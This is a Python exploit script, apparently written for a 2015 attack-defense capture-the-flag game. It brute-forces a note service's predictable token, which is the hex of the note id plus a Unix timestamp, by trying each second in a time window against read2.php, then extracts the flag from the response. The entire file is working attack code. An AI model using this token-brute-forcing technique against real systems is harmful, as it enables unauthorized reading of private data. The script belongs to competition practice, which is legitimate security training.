#!/usr/bin/env python
# -*- coding: utf-8 -*- 

import requests
import re
import sys
import os
import time
from datetime import datetime, timedelta


__DATE_FORMAT__ = '%m/%d/%y %H:%M:%S'
__CTF_BEGIN__   = '12/04/15 18:00:00'
__CTF_END__     = '12/05/15 02:00:00'

__REGEX__ = re.compile(r'<p>Your note was: (.+)</p>')

def usage():
    print "Usage: %s <ip> <port> <flag_id> [date]" % os.path.basename(__file__)
    print 
    print "Optional:"
    print "     date        date and time to consider to bruteforce the token."
    print "                 Must follow the format '%s'." % __DATE_FORMAT__
    print "                 The timezone must be 'Europe/London'. If no date "
    print "                 is given, brute from %s to %s" % (__CTF_BEGIN__,
                                                            __CTF_END__)

def craft_token(note_id, date):
    return (note_id + str(int(time.mktime(date.timetuple())))).encode('hex')

def exploit(ip, port, flag_id, frm, to):
    d = timedelta(0,1)
    num_sec = (to - frm).total_seconds()
    index = 0
    print "\x1b[?25l", # hide the cursor
    while to > frm:
        response = requests.get('http://%s:%d/read2.php' % (ip, int(port)),
            params={
                'note_id': flag_id,
                'token': craft_token(flag_id, to)
            })
        if response.status_code == requests.codes.ok:
            m = __REGEX__.search(response.text)
            if m:
                print "\x1b[?25h" # restore the cursor
                print "found for %s" % to
                return m.group(1)

        # Print progress
        index += 1
        print "\x1b[GTested: %d / %d" % (index, num_sec),
        to -= d;        # try second before
    else:
        print "\x1b[?25h" # restore the cursor
        raise Exception('Flag not found')


if __name__ == '__main__':
    if len(sys.argv) < 4:
        usage()
        sys.exit(1)

    elif len(sys.argv) > 5:
        sys.argv[4] += ' ' + sys.argv[5]      # handle case where date isn't
                                              # enclosed by "" or ''

    os.environ['TZ'] = 'Europe/London'
    if len(sys.argv) > 4:
        to = datetime.strptime(sys.argv[4], __DATE_FORMAT__)
        frm = to - timedelta(0, 5 * 60)     # last 5 minutes
    else:
        frm = datetime.strptime(__CTF_BEGIN__, __DATE_FORMAT__)
        to = datetime.strptime(__CTF_END__, __DATE_FORMAT__)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    flag_id = sys.argv[3]
    print exploit(ip, port, flag_id, frm, to)

